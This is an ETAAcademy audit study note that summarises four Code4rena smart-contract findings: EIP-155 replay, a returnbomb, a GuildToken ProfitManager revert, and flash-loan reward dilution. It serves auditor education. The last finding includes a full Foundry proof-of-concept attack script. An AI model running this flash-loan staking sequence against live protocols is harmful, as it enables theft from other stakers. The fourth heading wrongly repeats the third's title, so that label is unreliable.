# ETAAcademy-Adudit: 1. Dos

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>01. DOS</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>dos</th>
          <td>dos</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining

## 1. [Medium] EIP-155 is not enforced, allowing attackers/malicious operators to profit from replaying transactions

### Absence of enforcement of EIP-155

- Summary: Attackers and malicious operators profit from replaying transactions due to the absence of enforcement of **`EIP-155`**, which prevents replay attacks by including the chain ID in the transaction's signature.

- Impact & Recommendation: Attackers can replay transactions from networks not protected by EIP-155, while operators can replay early user transactions from other EVM networks to collect gas fees or profit directly.
  <br> 🐬: [Source](https://github.com/code-423n4/2023-10-zksync-findings/issues/882) & [Report](https://github.com/code-423n4/2023-10-zksync)

  <details><summary>POC</summary>

  ```rust

                  let should_check_chain_id = if matches!(
                    common_data.transaction_type,
                    TransactionType::LegacyTransaction
                ) && common_data.extract_chain_id().is_some()
                {
                    U256([1, 0, 0, 0])
                } else {
                    U256::zero()
                };
    pub fn extract_chain_id(&self) -> Option<u64> {
        let bytes = self.input_data()?;
        let chain_id = match bytes.first() {
            Some(x) if *x >= 0x80 => {
                let rlp = Rlp::new(bytes);
                let v = rlp.val_at(6).ok()?;
                PackedEthSignature::unpack_v(v).ok()?.1?
            }

  ```

  </details>

## 2. [Low] CoreRef::emergencyAction is susceptible to returnbomb attack

### Lack of assembly to handle returned data

- Summary: **`Emergency()`** lack of assembly to handle returned data leaves it vulnerable to returnbomb attacks, especially when interacting with untrusted external contracts.

- Impact & Recommendation: Consider using the ExcessivelySafeCall library or assembly to mitigate the vulnerability.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity

    /// @notice due to inflexibility of current smart contracts,
    /// add this ability to be able to execute arbitrary calldata
    /// against arbitrary addresses.
    /// callable only by governor
    function emergencyAction(Call[] calldata calls)
        external
        payable
        onlyCoreRole(CoreRoles.GOVERNOR)
        returns (bytes[] memory returnData)
    {
        returnData = new bytes[](calls.length);
        for (uint256 i = 0; i < calls.length; i++) {
            address payable target = payable(calls[i].target);
            uint256 value = calls[i].value;
            bytes calldata callData = calls[i].callData;
            (bool success, bytes memory returned) = target.call{value: value}(callData);
            require(success, "CoreRef: underlying call reverted");
            returnData[i] = returned;
        }
    }

  ```

  </details>

## 3. [Medium] Wrong ProfitManager in GuildToken, will always revert for other types of gauges leading to bad debt

### ProfitManagers in different markets

- Summary: In GuildToken.sol, setting profitManager in the constructor causes problems as different markets have different ProfitManagers. Calling `notifyPnL()` with negative values from other term types triggers `notifyGaugeLoss()`, leading to reverts because the caller differs from the constructor-set ProfitManager.

- Impact & Recommendation: In GuildToken.sol, ProfitManager should be dynamically called to accommodate different ProfitManagers for each market.
  <br> 🐬: [Source](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/1001) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity
    function testNotifyPnLCannotBeCalledWithNegative() public {
        // Show that for the initial gUSDC term there is no problem.
        credit.mint(address(profitManager), 10);
        profitManager.notifyPnL(term, -1);
        creditWETH.mint(address(profitManagerWETH), 10);
        vm.expectRevert("UNAUTHORIZED");
        profitManagerWETH.notifyPnL(termWETH, -1);
    }

  ```

  </details>

## 4. [Medium] Wrong ProfitManager in GuildToken, will always revert for other types of gauges leading to bad debt

### Staking and unstaking in the same block

- Summary: A borrower initiates a loan with the minimum amount in a term without mandatory partial repayment and transfers the funds to `EXPLOITER` after interest accrual. `EXPLOITER` then utilizes a flash loan to stake the amount into the same term via SurplusGuildMinter, repays the original loan, triggering `notifyPnL()`, which reduces rewards for other Guild holders by updating the `_gaugeProfitIndex`. Finally, `EXPLOITER` unstakes and returns the flash loan.

- Impact & Recommendation: To prevent attackers from instantly accumulating rewards without being long-term stakeholders like others in the system, several protective measures can be implemented. These include disallowing staking and unstaking in the same block, introducing staking/unstaking fees, or implementing a "warm-up period" during which stakers are unable to accumulate interest.
  <br> 🐬: [Source](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/994) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity
    // SPDX-License-Identifier: GPL-3.0-or-later
    pragma solidity 0.8.13;
    import {Test, console} from "@forge-std/Test.sol";
    import {Core} from "@src/core/Core.sol";
    import {CoreRoles} from "@src/core/CoreRoles.sol";
    import {GuildToken} from "@src/tokens/GuildToken.sol";
    import {CreditToken} from "@src/tokens/CreditToken.sol";
    import {ProfitManager} from "@src/governance/ProfitManager.sol";
    import {MockLendingTerm} from "@test/mock/MockLendingTerm.sol";
    import {RateLimitedMinter} from "@src/rate-limits/RateLimitedMinter.sol";
    import {SurplusGuildMinter} from "@src/loan/SurplusGuildMinter.sol";
    contract DeflateGuildHoldersRewardsUnitTest is Test {
        address private governor = address(1);
        address private guardian = address(2);
        address private ALICE = makeAddr("alice");
        address private EXPLOITER = makeAddr("exploiter");
        address private STAKER1 = makeAddr("staker1");
        address private STAKER2 = makeAddr("staker2");
        address private STAKER3 = makeAddr("staker3");
        address private termUSDC;
        Core private core;
        ProfitManager private profitManagerUSDC;
        CreditToken gUSDC;
        GuildToken guild;
        RateLimitedMinter rlgm;
        SurplusGuildMinter sgmUSDC;
        // GuildMinter params
        uint256 constant MINT_RATIO = 2e18;
        uint256 constant REWARD_RATIO = 5e18;
        function setUp() public {
            vm.warp(1679067867);
            vm.roll(16848497);
            core = new Core();
            profitManagerUSDC = new ProfitManager(address(core));
            gUSDC = new CreditToken(address(core), "gUSDC", "gUSDC");
            guild = new GuildToken(address(core), address(profitManagerUSDC));
            rlgm = new RateLimitedMinter(
                address(core), /*_core*/
                address(guild), /*_token*/
                CoreRoles.RATE_LIMITED_GUILD_MINTER, /*_role*/
                type(uint256).max, /*_maxRateLimitPerSecond*/
                type(uint128).max, /*_rateLimitPerSecond*/
                type(uint128).max /*_bufferCap*/
            );
            sgmUSDC = new SurplusGuildMinter(
                address(core),
                address(profitManagerUSDC),
                address(gUSDC),
                address(guild),
                address(rlgm),
                MINT_RATIO,
                REWARD_RATIO
            );
            profitManagerUSDC.initializeReferences(address(gUSDC), address(guild), address(0));
            termUSDC = address(new MockLendingTerm(address(core)));
            // roles
            core.grantRole(CoreRoles.GOVERNOR, governor);
            core.grantRole(CoreRoles.GUARDIAN, guardian);
            core.grantRole(CoreRoles.CREDIT_MINTER, address(this));
            core.grantRole(CoreRoles.GUILD_MINTER, address(this));
            core.grantRole(CoreRoles.GAUGE_ADD, address(this));
            core.grantRole(CoreRoles.GAUGE_REMOVE, address(this));
            core.grantRole(CoreRoles.GAUGE_PARAMETERS, address(this));
            core.grantRole(CoreRoles.GUILD_MINTER, address(rlgm));
            core.grantRole(CoreRoles.RATE_LIMITED_GUILD_MINTER, address(sgmUSDC));
            core.grantRole(CoreRoles.GUILD_SURPLUS_BUFFER_WITHDRAW, address(sgmUSDC));
            core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(this));
            core.renounceRole(CoreRoles.GOVERNOR, address(this));
            guild.setMaxGauges(10);
            guild.addGauge(1, termUSDC);
            // labels
            vm.label(address(core), "core");
            vm.label(address(profitManagerUSDC), "profitManagerUSDC");
            vm.label(address(gUSDC), "gUSDC");
            vm.label(address(guild), "guild");
            vm.label(address(rlgm), "rlcgm");
            vm.label(address(sgmUSDC), "sgmUSDC");
            vm.label(termUSDC, "termUSDC");
        }
        function testGuildHoldersRewardsWithoutEXPLOITER() public {
            // 3 users borrow gUSDC and stake them into the gUSDC term
            // In reality there may be more users, but for testing purposes, three are sufficient.
            gUSDC.mint(STAKER1, 200e18);
            gUSDC.mint(STAKER2, 800e18);
            gUSDC.mint(STAKER3, 600e18);
            vm.startPrank(STAKER1);
            gUSDC.approve(address(sgmUSDC), 200e18);
            sgmUSDC.stake(termUSDC, 200e18);
            vm.stopPrank();
            vm.startPrank(STAKER2);
            gUSDC.approve(address(sgmUSDC), 800e18);
            sgmUSDC.stake(termUSDC, 800e18);
            vm.stopPrank();
            vm.startPrank(STAKER3);
            gUSDC.approve(address(sgmUSDC), 600e18);
            sgmUSDC.stake(termUSDC, 600e18);
            vm.stopPrank();
            // Alice borrows 10 gUSDC. There's no borrow logic involved due to MockLendingTerm, but it's not necessary for the test.
            uint borrowTime = block.timestamp;
            gUSDC.mint(ALICE, 100e18);
            vm.warp(block.timestamp + 150 days);
            uint256 interest = _computeAliceLoanInterest(borrowTime, 100e18);
            vm.prank(governor);
            profitManagerUSDC.setProfitSharingConfig(
                0.05e18, // surplusBufferSplit
                0.9e18, // creditSplit
                0.05e18, // guildSplit
                0, // otherSplit
                address(0) // otherRecipient
            );
            gUSDC.mint(address(profitManagerUSDC), interest);
            profitManagerUSDC.notifyPnL(termUSDC, int256(interest));
            sgmUSDC.getRewards(STAKER1, termUSDC);
            sgmUSDC.getRewards(STAKER2, termUSDC);
            sgmUSDC.getRewards(STAKER3, termUSDC);
            console.log("------------------------------BEFORE ATTACK------------------------------");
            console.log("Staker1 credit reward:                                  ", gUSDC.balanceOf(address(STAKER1)));
            console.log("Staker1 guild reward:                                  ", guild.balanceOf(address(STAKER1)));
            console.log("Staker2 credit reward:                                 ", gUSDC.balanceOf(address(STAKER2)));
            console.log("Staker2 guild reward:                                  ", guild.balanceOf(address(STAKER2)));
            console.log("Staker3 credit reward:                                  ", gUSDC.balanceOf(address(STAKER3)));
            console.log("Staker3 guild reward:                                  ", guild.balanceOf(address(STAKER3)));
            console.log("GaugeProfitIndex:                                     ", profitManagerUSDC.gaugeProfitIndex(termUSDC));
        }
        function testGuildHoldersRewardsAfterEXPLOITER() public {
            gUSDC.mint(STAKER1, 200e18);
            gUSDC.mint(STAKER2, 800e18);
            gUSDC.mint(STAKER3, 600e18);
            vm.startPrank(STAKER1);
            gUSDC.approve(address(sgmUSDC), 200e18);
            sgmUSDC.stake(termUSDC, 200e18);
            vm.stopPrank();
            vm.startPrank(STAKER2);
            gUSDC.approve(address(sgmUSDC), 800e18);
            sgmUSDC.stake(termUSDC, 800e18);
            vm.stopPrank();
            vm.startPrank(STAKER3);
            gUSDC.approve(address(sgmUSDC), 600e18);
            sgmUSDC.stake(termUSDC, 600e18);
            vm.stopPrank();
            // Alice borrows 10 gUSDC. There's no borrow logic involved due to MockLendingTerm, but it's not necessary for the test.
            uint borrowTime = block.timestamp;
            gUSDC.mint(ALICE, 100e18);
            // NOTE: Alice needs to transfer the borrowed 100e18 gUSDC to EXPLOITER for repayment.

            console.log("-------------------------------AFTER ATTACK-------------------------------");
            console.log("EXPLOITER Credit Balance before flashloan:                              ", gUSDC.balanceOf(EXPLOITER));
            // EXPLOITER gets a flashloan.
            gUSDC.mint(EXPLOITER, 10_000_000e18);
            console.log("EXPLOITER Credit Balance after flashloan:      ", gUSDC.balanceOf(EXPLOITER));
            vm.startPrank(EXPLOITER);
            gUSDC.approve(address(sgmUSDC), 10_000_000e18);
            sgmUSDC.stake(termUSDC, 10_000_000e18);
            console.log("EXPLOITER Credit balance after stake:                                   ", gUSDC.balanceOf(EXPLOITER));
            vm.stopPrank();
            vm.warp(block.timestamp + 150 days);
            uint256 interest = _computeAliceLoanInterest(borrowTime, 100e18);
            vm.prank(governor);
            profitManagerUSDC.setProfitSharingConfig(
                0.05e18, // surplusBufferSplit
                0.9e18, // creditSplit
                0.05e18, // guildSplit
                0, // otherSplit
                address(0) // otherRecipient
            );
            profitManagerUSDC.notifyPnL(termUSDC, int256(interest));

            sgmUSDC.getRewards(EXPLOITER, termUSDC);
            console.log("EXPLOITER (instant) Credit reward:                     ", gUSDC.balanceOf(address(EXPLOITER)));
            console.log("EXPLOITER (instant) Guild reward:                     ", guild.balanceOf(address(EXPLOITER)));
            //EXPLOITER's profit is based on the guild split since he own almost all of the GUILD totalSupply.
            vm.startPrank(EXPLOITER);
            sgmUSDC.unstake(termUSDC, 10_000_000e18);
            vm.stopPrank();
            console.log("EXPLOITER credit balance after unstake:        ", gUSDC.balanceOf(EXPLOITER));
            // NOTE: EXPLOITER repays the flash loan here.
            sgmUSDC.getRewards(STAKER1, termUSDC);
            sgmUSDC.getRewards(STAKER2, termUSDC);
            sgmUSDC.getRewards(STAKER3, termUSDC);
            console.log("Staker1 credit reward:                                      ", gUSDC.balanceOf(address(STAKER1)));
            console.log("Staker1 guild reward:                                      ", guild.balanceOf(address(STAKER1)));
            console.log("Staker2 credit reward:                                     ", gUSDC.balanceOf(address(STAKER2)));
            console.log("Staker2 guild reward:                                      ", guild.balanceOf(address(STAKER2)));
            console.log("Staker3 credit reward:                                     ", gUSDC.balanceOf(address(STAKER3)));
            console.log("Staker3 guild reward:                                      ", guild.balanceOf(address(STAKER3)));
            console.log("GaugeProfitIndex:                                     ", profitManagerUSDC.gaugeProfitIndex(termUSDC));
        }
        // Function that will compute Alice's interest with which notifyPnL will be called so that the attack is as accurate as possible
        function _computeAliceLoanInterest(uint borrowTime, uint borrowAmount) private view returns (uint interest) {
            uint256 _INTEREST_RATE = 0.10e18; // 10% APR --- from LendingTerm tests
            uint256 YEAR = 31557600;
            interest = (borrowAmount * _INTEREST_RATE * (block.timestamp - borrowTime)) / YEAR / 1e18;
        }
    }

  ```

  </details>
